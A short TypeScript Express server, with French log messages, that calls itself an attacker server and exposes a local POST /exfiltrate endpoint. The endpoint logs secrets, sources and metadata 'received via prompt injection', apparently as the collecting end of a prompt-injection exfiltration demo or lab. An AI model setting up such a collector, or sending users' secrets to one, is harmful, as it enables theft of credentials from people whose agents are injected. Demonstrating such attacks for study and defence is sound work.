import express, { Request, Response } from 'express';

const app = express();
const PORT = 3333;

app.use(express.json());

interface ExfiltrateBody {
  secret?: string;
  source?: string;
  metadata?: unknown;
}

app.post('/exfiltrate', (req: Request<{}, {}, ExfiltrateBody>, res: Response) => {
  const { secret, source, metadata } = req.body;

  console.log('\n========================================');
  console.log('  [!] SECRET RECU VIA PROMPT INJECTION  ');
  console.log('========================================');
  if (source)   console.log(`  Source   : ${source}`);
  if (metadata) console.log(`  Metadata : ${JSON.stringify(metadata)}`);
  console.log(`  Secret   : ${secret ?? JSON.stringify(req.body)}`);
  console.log('========================================\n');

  res.json({ status: 'received' });
});

app.listen(PORT, () => {
  console.log(`[*] Serveur attaquant en écoute sur http://localhost:${PORT}`);
  console.log(`[*] Endpoint d'exfiltration : POST /exfiltrate`);
  console.log(`[*] Payload attendu         : { "secret": "...", "source": "...", "metadata": {} }\n`);
});
